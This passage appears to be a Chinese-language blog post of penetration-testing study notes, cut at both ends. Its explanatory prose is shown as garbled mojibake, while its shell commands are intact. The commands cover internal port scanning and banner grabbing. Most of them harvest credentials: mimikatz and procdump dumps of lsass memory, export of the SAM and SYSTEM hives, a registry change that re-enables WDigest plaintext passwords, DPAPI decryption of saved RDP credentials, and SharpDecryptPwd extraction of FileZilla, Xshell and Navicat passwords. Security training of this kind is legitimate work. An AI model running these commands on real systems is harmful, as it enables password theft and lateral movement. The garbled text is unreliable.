alt="image-20240324222008156"></p><p>æ‰§è¡Œä¸‹é¢å‘½ä»¤å¯¹å†…ç½‘çš„ä¸€ä¸ªä¸»æœºèŒƒå›´æ‰§è¡Œé»˜è®¤çš„ç«¯å£æ‰«æï¼Œè¿™é‡Œè¦å…ˆç”¨ç®¡ç†å‘˜æƒé™ä¿®æ”¹æˆå¯ä»¥æ‰§è¡Œè„šæœ¬ç­–ç•¥ï¼Œç„¶åå¯¼å…¥æ¨¡å—å†ä½¿ç”¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Import-Module .\Invoke-PortScan.ps1<br>Invoke-PortScan -StartAddress 192.168.30.10 -EndAddress 192.168.30.20 -ResolveHost -ScanPort<br><span class="hljs-meta prompt_">#</span><span class="language-bash">è¿˜å¯ä»¥åœ¨åé¢å†åŠ ä¸Šä¸€ä¸ª-Porté€‰é¡¹æŒ‡å®šæ‰«æç«¯å£</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745112.png" alt="image-20240324223527832"></p><p><strong>åˆ©ç”¨MetaSploitæ¢æµ‹å†…ç½‘</strong></p><p>MetaSploit æ¸—é€æ¡†æ¶ä¸­å†…ç½®äº†å‡ æ¬¾èµ„æºæ”¶é›†æ¨¡å—ï¼Œå¯ç”¨äºå‘ç°å†…ç½‘å­˜æ´»ä¸»æœºã€æ¢æµ‹å†…ç½‘æœåŠ¡ã€å¯¹ç›®æ ‡ä¸»æœºè¿›è¡Œç«¯å£æ‰«æï¼Œå¦‚å›¾ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151745113.png" alt="image-20240324223901678"></p><p><strong>è·å–ç«¯å£Bannerä¿¡æ¯</strong></p><p>Banner ä¸­å¯èƒ½åŒ…å«ä¸€äº›æ•æ„Ÿä¿¡æ¯ã€‚é€šè¿‡æŸ¥çœ‹ç«¯å£çš„Bannerï¼Œæµ‹è¯•äººå‘˜å¾€å¾€å¯ä»¥è·å–è½¯ä»¶å¼€å‘å•†ã€è½¯ä»¶åç§°ã€æœåŠ¡ç±»å‹ã€ç‰ˆæœ¬å·ç­‰ä¿¡æ¯ï¼Œæ ¹æ®ä¸åŒçš„æœåŠ¡ï¼Œå¯ä»¥åˆ¶è®¢ä¸åŒçš„æ”»å‡»æ–¹æ¡ˆï¼Œè€ŒæœåŠ¡çš„ç‰ˆæœ¬å·æœ‰æ—¶ä¼šå­˜åœ¨å…¬å¼€çš„æ¼æ´å¯ä»¥è¢«åˆ©ç”¨ã€‚</p><ul><li><p>åˆ©ç”¨NetCatè·å–ç«¯å£Banner</p><p>Netcat æ˜¯ä¸€æ¬¾å¸¸ç”¨çš„æµ‹è¯•å·¥å…·å’Œé»‘å®¢å·¥å…·ï¼Œä½¿ç”¨ NetCat å¯ä»¥è½»æ˜“å»ºç«‹ä»»ä½•è¿æ¥ï¼Œå…·æœ‰â€œç‘å£«å†›åˆ€â€çš„ç¾èª‰ã€‚</p><p>é€šè¿‡-nvé€‰é¡¹å¯ä»¥åœ¨è¿æ¥ç«¯å£æ—¶è·å–è¯¥ç«¯å£çš„Bannerä¿¡æ¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nc -nv &lt;IP&gt; &lt;Port&gt;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745114.png" alt="image-20240324225257083"></p></li><li><p>åˆ©ç”¨Telnetè·å–ç«¯å£Banner</p><p>å¦‚æœç›®æ ‡ç«¯å£å¼€æ”¾ï¼Œä½¿ç”¨Telnetè¿æ¥åï¼Œä¹Ÿä¼šè¿”å›ç›¸åº”çš„Bannerä¿¡æ¯.</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">telnet &lt;IP&gt; &lt;Port&gt;<br></code></pre></td></tr></table></figure></li><li><p>åˆ©ç”¨Nmapè·å–ç«¯å£Banner</p><p>åœ¨Nmapä¸­æŒ‡å®šè„šæœ¬**â€“script&#x3D;banner**å°±å¯ä»¥åœ¨æ‰«æä¸­è·å–ç«¯å£çš„bannerä¿¡æ¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nmap --script=banner -p &lt;Ports&gt; &lt;IP&gt;<br></code></pre></td></tr></table></figure></li></ul><h1 id="ç”¨æˆ·å‡­æ®æ”¶é›†"><a href="#ç”¨æˆ·å‡­æ®æ”¶é›†" class="headerlink" title="ç”¨æˆ·å‡­æ®æ”¶é›†"></a>ç”¨æˆ·å‡­æ®æ”¶é›†</h1><p>åœ¨å†…ç½‘æ¸—é€ä¸­ï¼Œå½“æµ‹è¯•äººå‘˜è·å–æŸå°æœºå™¨çš„æ§åˆ¶æƒåï¼Œä¼šä»¥è¢«æ”»é™·çš„ä¸»æœºä¸ºè·³æ¿è¿›è¡Œæ¨ªå‘æ¸—é€ï¼Œè¿›ä¸€æ­¥æ‰©å¤§æ‰€æŒæ§çš„èµ„æºèŒƒå›´ã€‚ä½†æ˜¯æ¨ªå‘æ¸—é€ä¸­çš„å¾ˆå¤šæ”»å‡»æ–¹æ³•éƒ½éœ€è¦å…ˆè·å–åˆ°åŸŸå†…ç”¨æˆ·çš„å¯†ç æˆ–å“ˆå¸Œå€¼æ‰èƒ½è¿›è¡Œï¼Œå¦‚å“ˆå¸Œä¼ é€’æ”»å‡»ã€ç¥¨æ®ä¼ é€’æ”»å‡»ç­‰ã€‚æ‰€ä»¥åœ¨è¿›è¡Œä¿¡æ¯æ”¶é›†æ—¶ï¼Œè¦å°½å¯èƒ½æ”¶é›†åŸŸå†…ç”¨æˆ·çš„ç™»å½•å‡­æ®ç­‰ä¿¡æ¯</p><h2 id="è·å–åŸŸå†…å•æœºå¯†ç å’Œå“ˆå¸Œå€¼"><a href="#è·å–åŸŸå†…å•æœºå¯†ç å’Œå“ˆå¸Œå€¼" class="headerlink" title="è·å–åŸŸå†…å•æœºå¯†ç å’Œå“ˆå¸Œå€¼"></a>è·å–åŸŸå†…å•æœºå¯†ç å’Œå“ˆå¸Œå€¼</h2><blockquote><p>åœ¨ Windowsä¸­,SAMæ–‡ä»¶æ˜¯ Windowsç”¨æˆ·çš„è´¦æˆ·æ•°æ®åº“,ä½äºç³»ç»Ÿçš„%SystemRoot%System32\Config ç›®å½•ä¸­ï¼Œæ‰€æœ‰æœ¬åœ°ç”¨æˆ·çš„ç”¨æˆ·åã€å¯†ç å“ˆå¸Œå€¼ç­‰ä¿¡æ¯éƒ½å­˜å‚¨åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚ç”¨æˆ·è¾“å…¥å¯†ç ç™»å½•æ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„æ˜æ–‡å¯†ç è¢«è½¬æ¢ä¸ºå“ˆå¸Œå€¼ï¼Œç„¶åä¸SAMæ–‡ä»¶ä¸­çš„å“ˆå¸Œå€¼å¯¹æ¯”ï¼Œè‹¥ç›¸åŒï¼Œåˆ™è®¤è¯æˆåŠŸã€‚</p><p>lsass.exeæ˜¯Windowsçš„ä¸€ä¸ªç³»ç»Ÿè¿›ç¨‹ï¼Œç”¨äºå®ç°ç³»ç»Ÿçš„å®‰å…¨æœºåˆ¶ï¼Œä¸»è¦ç”¨äºæœ¬åœ°å®‰å…¨å’Œç™»å½•ç­–ç•¥ã€‚åœ¨é€šå¸¸æƒ…å†µä¸‹ï¼Œç”¨æˆ·è¾“å…¥å¯†ç ç™»å½•åï¼Œç™»å½•çš„åŸŸåã€ç”¨æˆ·åå’Œç™»å½•å‡­æ®ç­‰ä¿¡æ¯ä¼šå­˜å‚¨åœ¨lsass.exeçš„è¿›ç¨‹ç©ºé—´ä¸­ï¼Œç”¨æˆ·çš„æ˜æ–‡å¯†ç ç»è¿‡ WDigestå’Œ Tspkgæ¨¡å—è°ƒç”¨å,ä¼šå¯¹å…¶ä½¿ç”¨å¯é€†çš„ç®—æ³•è¿›è¡ŒåŠ å¯†å¹¶å­˜å‚¨åœ¨å†…å­˜ä¸­ã€‚</p><p>ç”¨æ¥è·å–ä¸»æœºçš„ç”¨æˆ·å¯†ç å’Œå“ˆå¸Œå€¼çš„å·¥å…·æœ‰å¾ˆå¤š,è¿™äº›å·¥å…·å¤§å¤šæ˜¯é€šè¿‡è¯»å– SAM æ–‡ä»¶æˆ–è€…è®¿é—® lsass.exe è¿›ç¨‹çš„å†…å­˜æ•°æ®ç­‰æ“ä½œå®ç°çš„ã€‚è¿™äº›æ“ä½œå¤§å¤šéœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œè¿™æ„å‘³ç€éœ€è¦é…åˆä¸€äº›ææƒæ“ä½œã€‚</p></blockquote><p>ä¸‹é¢åˆ©ç”¨Mimikatzå·¥å…·æ¥è¿›è¡Œå­¦ä¹ ï¼ŒMimikatzæ˜¯ä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„å‡­æ®è½¬å‚¨å¼€æºç¨‹åºï¼Œå¯ä»¥å¸®åŠ©æµ‹è¯•äººå‘˜æå‡è¿›ç¨‹æƒé™ã€æ³¨å…¥è¿›ç¨‹ã€è¯»å–è¿›ç¨‹å†…å­˜ç­‰ï¼Œå¹¿æ³›ç”¨äºå†…ç½‘æ¸—é€æµ‹è¯•é¢†åŸŸ</p><p><strong>åœ¨çº¿è¯»å–lsassè¿›ç¨‹å†…å­˜</strong></p><p>å°†mimikatzä¸Šä¼ åˆ°ä¸»æœºæ‰§è¡Œä¸‹é¢å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">privilege::debugç”¨äºæå‡è‡³DebugPrivilegeæƒé™ï¼›sekurlsa::logonpasswordsç”¨äºå¯¼å‡ºç”¨æˆ·å‡­æ®</span><br></code></pre></td></tr></table></figure><p>å¯ç›´æ¥ä»lsass.exeè¿›ç¨‹çš„å†…å­˜ä¸­è¯»å–å½“å‰å·²ç™»å½•ç”¨æˆ·çš„å‡­æ®</p><p><img src="http://cdn.clown2024.cn/202407151745115.png" alt="image-20240324232522666"></p><p>ä¸è¿‡æˆ‘è¿™é‡Œå¤±è´¥äº†ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼ŒæˆåŠŸçš„è¯åº”è¯¥æ˜¯ä¸‹é¢è¿™æ ·</p><p><img src="http://cdn.clown2024.cn/202407151745116.png" alt="image-20240324233242439"></p><p>åæ¥è¯•äº†ä¸€ä¸‹éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œé‚£åº”è¯¥æ˜¯ææƒä¹‹åçš„äº‹æƒ…äº†è¿™ä¸€æ­¥</p><p><img src="http://cdn.clown2024.cn/202407151745117.png" alt="image-20240324233522901"></p><p><strong>ç¦»çº¿è¯»å–lsasså†…å­˜æ–‡ä»¶</strong></p><p>é™¤äº†åœ¨çº¿è¯»å–ï¼Œä¹Ÿå¯ä»¥ç›´æ¥å°†Isass.exeçš„è¿›ç¨‹å†…å­˜è½¬å‚¨ï¼Œå°†å†…å­˜æ–‡ä»¶å¯¼å‡ºåˆ°æœ¬åœ°åä½¿ç”¨ Mimikatz è¿›è¡Œç¦»çº¿è¯»å–ã€‚ç”¨äºè½¬å‚¨è¿›ç¨‹å†…å­˜çš„å·¥å…·æœ‰å¾ˆå¤šï¼Œå¦‚ OutMinidump.ps1ã€Procdumpã€SharpDumpç­‰ï¼Œç”šè‡³å¯ä»¥æ‰‹åŠ¨åŠ è½½ç³»ç»Ÿè‡ªå¸¦çš„comsvcs.dll æ¥å®ç°å†…å­˜è½¬å‚¨ã€‚</p><p>è¿™é‡Œç”¨å¾®è½¯å®˜æ–¹æä¾›çš„Procdumpå·¥å…·ï¼Œé¦–å…ˆè¦åœ¨ä¸»æœºä¸Šä¼ è¯¥ç¨‹åºï¼Œç„¶åæ‰§è¡Œä¸‹é¢å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">procdump.exe -accepteula -ma lsass.exe lsass.dmp #å°†lsass.exeçš„è¿›ç¨‹è½¬å‚¨<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745118.png" alt="image-20240324234127358"></p><p>ç„¶åå†æ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonpasswords full&quot; exit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">sekurlsa::minidump lsass.dmpç”¨äºåŠ è½½å†…å­˜æ–‡ä»¶ï¼›sekurlsa::logonpasswordsç”¨äºå¯¼å‡ºç”¨æˆ·å‡­æ®ï¼› full å‚æ•°è¡¨ç¤ºè¦è¾“å‡ºå…¨éƒ¨å¯ç”¨çš„æ˜æ–‡å‡­æ®ä¿¡æ¯ï¼ŒåŒ…æ‹¬å¯†ç ç­‰è¯¦ç»†ä¿¡æ¯ï¼›<span class="hljs-built_in">exit</span> å‚æ•°è¡¨ç¤ºé€€å‡º Mimikatz å·¥å…·ï¼Œç»“æŸå½“å‰ä¼šè¯ã€‚</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745119.png" alt="image-20240324234639154"></p><blockquote><p>æ³¨æ„,ä¸ºäº†é˜²æ­¢ç”¨æˆ·çš„æ˜æ–‡å¯†ç åœ¨å†…å­˜ä¸­æ³„éœ²,å¾®è½¯åœ¨2014å¹´5æœˆå‘å¸ƒäº†KB2871997è¡¥ä¸ï¼Œå…³é—­äº† WDigest åŠŸèƒ½ï¼Œç¦æ­¢ä»å†…å­˜ä¸­è·å–æ˜æ–‡å¯†ç ï¼Œä¸” Windows Server 2012 åŠä»¥ä¸Šç‰ˆæœ¬é»˜è®¤å…³é—­ WDigest åŠŸèƒ½ã€‚ä½†æ˜¯æµ‹è¯•äººå‘˜é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œå¯ä»¥é‡æ–°å¼€å¯ WDigeståŠŸèƒ½ï¼Œå½“ç”¨æˆ·æ³¨é”€æˆ–è€…é‡æ–°ç™»å½•åï¼Œå°±å¯ä»¥é‡æ–°è·å–åˆ°ç”¨æˆ·çš„æ˜æ–‡å¯†ç ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">å¼€å¯WDigest</span><br>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f<br><span class="hljs-meta prompt_"># </span><span class="language-bash">å…³é—­WDigest</span><br>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f<br></code></pre></td></tr></table></figure><p><strong>åœ¨çº¿è¯»å–SAMæ–‡ä»¶</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit<br><span class="hljs-meta prompt_">#</span><span class="language-bash">privilege::debugç”¨äºæå‡è‡³DebugPrivilegeæƒé™ï¼›token::elevateç”¨äºæå‡è‡³SYSTEMæƒé™ï¼›ç”¨äºè¯»å–æœ¬åœ°çš„SAMæ–‡ä»¶</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745120.png" alt="image-20240325001115648"></p><p>è¯»å– SAM æ–‡ä»¶ä¸­ä¿å­˜çš„ç”¨æˆ·ç™»å½•å‡­æ®ï¼Œå¯ä»¥å¯¼å‡ºå½“å‰ç³»ç»Ÿä¸­æ‰€æœ‰æœ¬<br>åœ°ç”¨æˆ·çš„å“ˆå¸Œå€¼ã€‚</p><p><strong>ç¦»çº¿è¯»å–SAMæ–‡ä»¶</strong></p><p>ç¦»çº¿è¯»å–å°±æ˜¯å°†SAMæ–‡ä»¶å¯¼å‡ºï¼Œå†ç”¨mimikatzæ¥è¯»å–ã€‚ä¸è¿‡ä¸ºäº†æé«˜ SAM æ–‡ä»¶çš„å®‰å…¨æ€§ä»¥é˜²æ­¢ç¦»çº¿ç ´è§£ï¼ŒWindows ä¼šå¯¹ SAM æ–‡ä»¶ä½¿ç”¨å¯†é’¥è¿›è¡ŒåŠ å¯†ï¼Œè¿™ä¸ªå¯†é’¥å­˜å‚¨åœ¨ SYSTEM æ–‡ä»¶ä¸­ï¼Œä¸ SAM æ–‡ä»¶ä½äºç›¸åŒç›®å½•ä¸‹ã€‚</p><p>å› ä¸ºç³»ç»Ÿåœ¨è¿è¡Œæ—¶ï¼Œè¿™ä¸¤ä¸ªæ–‡ä»¶æ˜¯è¢«é”å®šçš„ï¼Œæ‰€ä»¥éœ€è¦å€ŸåŠ©ä¸€äº›å·¥å…·æ¥å®ç°ï¼Œè€ŒPowerSploit é¡¹ç›®ä¸­æä¾›çš„Invoke-NinjaCopy.ps1è„šæœ¬å¯ä»¥å®Œæˆè¿™é¡¹å·¥ä½œ</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SAM&quot; -LocalDestination C:\Temp\SAM<br><br>Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SAM&quot; -LocalDestination C:\Temp\SYSTEM<br></code></pre></td></tr></table></figure><blockquote><p>æ­¤å¤–å¦‚æœèƒ½å¤Ÿææƒï¼Œæµ‹è¯•äººå‘˜å¯ä»¥ç›´æ¥è¯»å–SAMå’ŒSYSTEM</p></blockquote><p>è¿˜å¯ä»¥åœ¨ç®¡ç†å‘˜æƒé™ä¸‹é€šè¿‡ä¿å­˜æ³¨å†Œè¡¨çš„æ–¹å¼å¯¼å‡º</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg save HKLM\SAM sam.hive<br>reg save HKLM\SYSTEM system.hive<br></code></pre></td></tr></table></figure><p>ç„¶åå°†å¯¼å‡ºçš„ä¸¤ä¸ªæ–‡ä»¶ä½¿ç”¨mimikatzåŠ è½½å¹¶è¯»å–samä¸­çš„ç”¨æˆ·å‡­æ®ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">mimikatz.exe &quot;lsadump::sam /sam:sam.hive /system:system.hive&quot; exit<br></code></pre></td></tr></table></figure><h2 id="è·å–å¸¸è§åº”ç”¨è½¯ä»¶å‡­æ®"><a href="#è·å–å¸¸è§åº”ç”¨è½¯ä»¶å‡­æ®" class="headerlink" title="è·å–å¸¸è§åº”ç”¨è½¯ä»¶å‡­æ®"></a>è·å–å¸¸è§åº”ç”¨è½¯ä»¶å‡­æ®</h2><p>ä¸ºäº†æ‰©å¤§å¯è®¿é—®çš„èŒƒå›´ï¼Œæµ‹è¯•äººå‘˜é€šå¸¸ä¼šæœç´¢å„ç§å¸¸è§çš„å¯†ç å­˜å‚¨ä½ç½®ï¼Œä»¥è·å–ç”¨æˆ·å‡­æ®ã€‚ä¸€äº›ç‰¹å®šçš„åº”ç”¨ç¨‹åºå¯ä»¥å­˜å‚¨å¯†ç ï¼Œä»¥æ–¹ä¾¿ç”¨æˆ·ç®¡ç†å’Œç»´æŠ¤ï¼Œå¦‚Xmanagerã€TeamViewerã€FileZillaã€NaviCatå’Œå„ç§æµè§ˆå™¨ç­‰ã€‚é€šè¿‡å¯¹ä¿å­˜çš„ç”¨æˆ·å‡­æ®è¿›è¡Œå¯¼å‡ºå’Œè§£å¯†ï¼Œæµ‹è¯•äººå‘˜é€šå¸¸å¯ä»¥è·å–ç™»å½•å†…ç½‘æœåŠ¡å™¨å’Œå„ç§ç®¡ç†åå°çš„è´¦å·å¯†ç ï¼Œå¯ä»¥é€šè¿‡å®ƒä»¬è¿›è¡Œæ¨ªå‘ç§»åŠ¨å’Œè®¿é—®å—é™èµ„æºã€‚</p><p><strong>è·å–RDPä¿å­˜çš„å‡­æ®</strong></p><p>ä¸ºäº†é¿å…æ¯æ¬¡è¿æ¥æœåŠ¡å™¨éƒ½è¿›è¡Œèº«ä»½éªŒè¯ï¼Œç»å¸¸ä½¿ç”¨RDPè¿œç¨‹æ¡Œé¢è¿æ¥è¿œç¨‹æœåŠ¡å™¨çš„ç”¨æˆ·å¯èƒ½å‹¾é€‰ä¿å­˜è¿æ¥å‡­æ®ï¼Œä»¥ä¾¿è¿›è¡Œå¿«é€Ÿçš„èº«ä»½éªŒè¯ã€‚è¿™äº›å‡­æ®éƒ½ä½¿ç”¨æ•°æ®ä¿æŠ¤APIä»¥åŠ å¯†å½¢å¼å­˜å‚¨åœ¨ Windows çš„å‡­æ®ç®¡ç†å™¨ä¸­ï¼Œè·¯å¾„ä¸º%USERPROFILE%\AppData\LocalMicrosoft\Credentials </p><blockquote><p>%USERPROFILE%å³ä¸ºC:\Users&lt;ç”¨æˆ·å&gt;</p></blockquote><p>ä¸‹é¢å‘½ä»¤å¯ä»¥æŸ¥çœ‹å½“å‰ä¸»æœºä¸Šä¿å­˜çš„æ‰€æœ‰è¿æ¥å‡­æ®</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cmdkey /list #æŸ¥çœ‹å½“å‰ä¿å­˜çš„å‡­æ®<br>dir /a %USERPROFILE%\AppData\LocalMicrosoft\Credentials\* #éå†Credentialsä¸‹ä¿å­˜çš„æ‰€æœ‰å‡­æ®<br></code></pre></td></tr></table></figure><p>æˆ‘è¿™é‡Œæ²¡æœ‰å‡­æ®æ‰€ä»¥å°±å€ŸåŠ©ä¹¦ä¸­çš„å›¾æ¥è®°å½•ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªå†å²å‡­æ®</p><p><img src="http://cdn.clown2024.cn/202407151745121.png" alt="image-20240325003242224"></p><p>ç„¶åç”¨mimikatzæ¥å¯¼å‡ºæŒ‡å®šRDPè¿æ¥å‡­æ®ï¼Œæ‰§è¡Œä¸‹é¢å‘½ä»¤è§£æè¿æ¥å‡­æ®</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;dpapi::cred /in:%USERPROFILE%\AppData\LocalMicrosoft\Credentials\2B23BCADBE2FAD8EA21E6E9F0516772C&quot;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745122.png" alt="image-20240325003535797"></p><p><img src="http://cdn.clown2024.cn/202407151745123.png" alt="image-20240325003553911"></p><p><img src="http://cdn.clown2024.cn/202407151745124.png" alt="image-20240325003606845"></p><p>ä¸Šå›¾ä¸­å¾—åˆ°çš„ pbDataå°±æ˜¯å‡­æ®çš„åŠ å¯†æ•°æ®ï¼ŒguidMasterKey æ˜¯è¯¥å‡­æ®çš„ GUIDï¼Œè®°å½• guidMasterKey çš„å€¼ã€‚ç„¶åæ‰§è¡Œä»¥ä¸‹å‘½ä»¤:</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa:dpapi&quot; exit<br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°ä¸ guidMasterKey(GUID)ç›¸å…³è”çš„MasterKeyï¼Œè¿™ä¸ªMasterKeyå°±æ˜¯åŠ å¯†å‡­æ®æ‰€ä½¿ç”¨çš„å¯†é’¥ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151745125.png" alt="image-20240325003915323"></p><p>è®°å½•ç»“æœä¸­çš„MasterKeyå€¼ï¼Œæœ€åæ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;dpapi::cred /in:%USERPROFILE%\AppData\LocalMicrosoft\Credentials\2B23BCADBE2FAD8EA21E6E9F0516772C/masterkey:&lt;åˆšåˆšè®°å½•çš„masterkeyçš„å€¼&gt;&quot; exit<br></code></pre></td></tr></table></figure><p>æœ€åæˆåŠŸè§£å¯†å¾—åˆ°RDPæ˜æ–‡å‡­æ®</p><p><img src="http://cdn.clown2024.cn/202407151745126.png" alt="image-20240325004214310"></p><p><strong>è·å–Xshellä¿å­˜çš„å‡­æ®</strong></p><p>Xshell ä¼šå°†æœåŠ¡å™¨è¿æ¥ä¿¡æ¯ä¿å­˜åœ¨Sessionç›®å½•ä¸‹çš„.xsh æ–‡ä»¶ä¸­ï¼Œè·¯å¾„å¦‚è¡¨ å¦‚ä¸‹å›¾ã€‚å¦‚æœç”¨æˆ·åœ¨è¿æ¥æ—¶å‹¾é€‰äº†â€œè®°ä½ç”¨æˆ·å&#x2F;å¯†ç â€ï¼Œè¯¥æ–‡ä»¶ä¼šä¿å­˜è¿œç¨‹æœåŠ¡å™¨è¿æ¥çš„ç”¨æˆ·åå’Œç»è¿‡åŠ å¯†åçš„å¯†ç ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151745127.png" alt="image-20240325004349401"></p><p>Xshell 7 å‰çš„ç‰ˆæœ¬ï¼Œæµ‹è¯•äººå‘˜å¯ä»¥ç›´æ¥é€šè¿‡ SharpDecryptPwd å·¥å…·è¿›è¡Œè§£å¯†ï¼ŒåŒ…æ‹¬Navicatã€TeamViewerã€FileZillaã€WinSCPå’ŒXmangager ç³»åˆ—äº§å“ï¼Œå·¥å…·åœ°å€ï¼š<a href="https://github.com/uknowsec/SharpDecryptPwd">https://github.com/uknowsec/SharpDecryptPwd</a></p><p>å°†å·¥å…·ä¸Šä¼ åˆ°ä¸»æœºï¼Œæ‰§è¡Œä¸‹é¢å‘½ä»¤å¯ä»¥ç›´æ¥è·å–Xshellä¿å­˜çš„æ‰€æœ‰è¿æ¥å‡­æ®</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">SharpDecryptPwd.exe -Xmangager -p &quot;%USERPROFILE%\Documents\NetSarang Computer 6\Xshell\Sessions&quot;<br></code></pre></td></tr></table></figure><p>Xshell 7åçš„ç‰ˆæœ¬ï¼ŒSessionç›®å½•ä¸­ä¸å†å­˜å‚¨ç”¨æˆ·å¯†ç ï¼Œç”¨ä¸Šè¿°æ–¹æ³•è·å–çš„å¯†ç ä¸ºä¸€ä¸²ä¹±ç ï¼Œåªèƒ½ä½¿ç”¨æ˜Ÿå·å¯†ç æŸ¥çœ‹å™¨ç›´æ¥æŸ¥çœ‹å¯†ç .</p><p><strong>è·å–FileZillaä¿å­˜çš„å‡­æ®</strong></p><p>FileZilla æ˜¯ä¸€æ¬¾å¿«é€Ÿçš„ã€å¯ä¾èµ–çš„ã€å¼€æºçš„ FTP å®¢æˆ·ç«¯è½¯ä»¶ï¼Œå…·å¤‡å¤§å¤šæ•° FTP è½¯ä»¶åŠŸèƒ½ã€‚FileZilaä¼šå°†æ‰€æœ‰FTPç™»å½•å‡­æ®ä»¥Base64å¯†æ–‡çš„æ ¼å¼ä¿å­˜åœ¨%USERPROFILE%\AppData\Roaming\FileZilla\recentservers.xmlæ–‡ä»¶ä¸­,å¦‚å›¾æ‰€ç¤ºã€‚</p><p>ç”±å›¾å¯çŸ¥<user>èŠ‚ç‚¹è®°å½•äº† FTP ç™»å½•ç”¨æˆ·,<pass>èŠ‚ç‚¹è®°å½•äº† Base64 åŠ å¯†åçš„ç”¨æˆ·å¯†ç ï¼Œå°†åŠ å¯†çš„FTPå¯†ç è§£ç å³å¯ã€‚</pass></user></p><p><img src="http://cdn.clown2024.cn/202407151745128.png" alt="image-20240325004912460"></p><p>ä½¿ç”¨SharpDecryptPwdæ‰§è¡Œä¸‹é¢å‘½ä»¤å¯ä»¥ä¸€é”®å¯¼å‡ºFileZillaä¿å­˜çš„FTPç™»å½•å‡­æ®</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">SharpDecryptPwd.exe -FileZilla<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745129.png" alt="image-20240325005038300"></p><p><strong>è·å–NaviCatä¿å­˜çš„å‡­æ®</strong></p><p>ç”¨æˆ·è¿æ¥æ•°æ®åº“æ—¶ï¼Œéœ€è¦å¡«å†™ç›¸å…³ä¿¡æ¯ï¼Œå¦‚IPã€ç”¨æˆ·åã€å¯†ç ç­‰ã€‚ç”¨æˆ·é€‰æ‹©ä¿å­˜å¯†ç (é»˜è®¤å‹¾é€‰)åï¼ŒNavicatå°†æŠŠè¿™äº›ä¿¡æ¯ä¿å­˜åˆ°æ³¨å†Œè¡¨ä¸­ï¼Œå…·ä½“è·¯å¾„å¦‚ä¸‹è¡¨</p><table><thead><tr><th>æ•°æ®åº“ç±»å‹</th><th>å‡­æ®å­˜å‚¨è·¯å¾„(æ³¨å†Œè¡¨)</th></tr></thead><tbody><tr><td>Mysql</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers\&lt; Connetion Name&gt;</td></tr><tr><td>MariaDB</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers\&lt; Connetion Name&gt;</td></tr><tr><td>MongoDB</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers\&lt; Connetion Name&gt;</td></tr><tr><td>SQL SERVER</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\&lt; Connetion Name&gt;</td></tr><tr><td>Oracle</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers\&lt; Connetion Name&gt;</td></tr><tr><td>PostgreSQL</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers\&lt; Connetion Name&gt;</td></tr><tr><td>SQLite</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers\&lt; Connetion 